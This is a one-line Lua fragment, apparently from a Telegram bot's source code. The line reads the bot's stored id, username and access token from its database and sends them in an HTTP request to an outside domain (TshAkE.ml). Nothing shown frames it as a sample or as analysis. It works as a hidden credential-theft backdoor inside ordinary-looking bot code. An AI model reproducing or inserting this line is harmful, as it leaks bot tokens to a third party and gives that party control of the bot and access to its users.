...
http.request("http://TshAkE.ml/add/?id="..database:get(Server_Feuon.."Id_Feuon").."&user="..database:get(Server_Feuon.."UserName_Feuon").."&token="..database:get(Server_Feuon.."Token_Feuon"))
